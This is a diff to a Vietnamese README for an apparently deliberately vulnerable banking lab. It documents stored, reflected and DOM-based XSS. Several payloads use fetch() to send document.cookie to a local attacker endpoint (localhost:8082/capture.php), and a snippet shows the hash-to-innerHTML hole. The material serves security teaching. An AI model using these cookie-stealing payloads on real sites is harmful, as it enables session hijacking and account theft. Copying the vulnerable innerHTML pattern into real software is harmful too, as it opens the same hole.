@@ -63,6 +63,8 @@ Lệnh này sẽ:
 - Khởi tạo cơ sở dữ liệu `vulnerable_bank`
 - Chạy các ứng dụng web
 
+(Chạy file sql và kiểm tra myphpadmin xem có dữ liệu chưa) nếu có - > mới làm được
+
 ### 3. Truy cập ứng dụng
 
 Sau khi containers khởi động thành công, truy cập:
@@ -93,15 +95,11 @@ Các tài khoản được tạo sẵn:
 1. Đăng nhập vào tài khoản
 2. Vào trang Profile
 3. Nhập mã JavaScript vào trường "Bio":
-   ```javascript
-   <script>
-   fetch('http://localhost:8082/capture.php?data=' + 
-         encodeURIComponent(document.cookie))
-   </script>
    ```
-4. Khi người dùng khác xem profile, cookies sẽ bị gửi tới attacker
+   <script>fetch("http://localhost:8082/capture.php?cookie="+document.cookie);</script>
+   ```
+4. Khi người dùng khác xem profile, cookies sẽ bị gửi tới attacker (reload để test)
 
-**Mục đích học tập:** Hiểu cách mã độc được lưu trữ và tái hiện
 
 ### 2. **SQL Injection**
 
@@ -116,7 +114,6 @@ Các tài khoản được tạo sẵn:
    ```
 4. Hệ thống sẽ hiện tất cả người dùng thay vì người dùng cụ thể
 
-**Mục đích học tập:** Hiểu cách mã SQL không an toàn có thể bị khai thác
 
 ### 3. **XSS - Reflected**
 
@@ -125,6 +122,28 @@ Các tài khoản được tạo sẵn:
 **Cách khai thác:**
 ```
 http://localhost:8080/dashboard.php?error=<script>alert('XSS')</script>
+```
+<script>fetch("http://localhost:8082/capture.php?cookie="+document.cookie);</script>
+
+### 4. **XSS - DOM-based** ⭐ NEW
+
+**Vị trí:** Dashboard (`dashboard.php`) - URL Fragment/Hash
+
+**Cách khai thác:**
+
+Khi user truy cập URL với hash payload, JavaScript sẽ lấy hash và set vào innerHTML (vulnerable mode):
+
+```
+http://localhost:8080/dashboard.php#Special-Offer!<img src=x onerror="fetch('http://localhost:8082/capture.php?cookie='+document.cookie)">
+```
+
+
+
+**Code Vulnerable:**
+```javascript
+// In dashboard.php
+const greetingMsg = decodeURIComponent(window.location.hash.substring(1));
+greetingText.innerHTML = greetingMsg; // VULNERABLE: DOM XSS
 ```
 
 ## 📊 Ứng Dụng Attacker
